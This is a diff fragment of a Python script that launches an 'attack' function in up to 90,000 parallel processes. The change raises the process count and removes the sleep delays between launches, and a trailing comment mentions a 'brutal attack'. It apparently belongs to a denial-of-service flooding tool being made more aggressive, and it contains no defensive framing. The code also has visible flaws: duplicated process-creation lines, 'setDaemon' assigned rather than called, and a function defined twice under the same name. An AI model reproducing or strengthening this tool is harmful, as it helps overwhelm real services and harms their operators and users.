@@ -87,28 +87,28 @@ bar2.finish()
 
 
 def send4attack():
-  for i in range(80000): 
+  for i in range(90000): 
     mp = multiprocessing.Process(target=attack)
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
     mp.start() 
-    sleep(2.0)
+    
     
     
     
 send4attack()
 
-def send3attack():
-  for i in range(80000): 
+def send4attack():
+  for i in range(90000): 
     mp = multiprocessing.Process(target=attack)
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = True
     mp.start() 
-    sleep(1.0)
     
     
     
-send3attack()
+    
+send4attack()
 
 #time.sleep random package- sleep(0.1) in brutal attack
 exit(1)
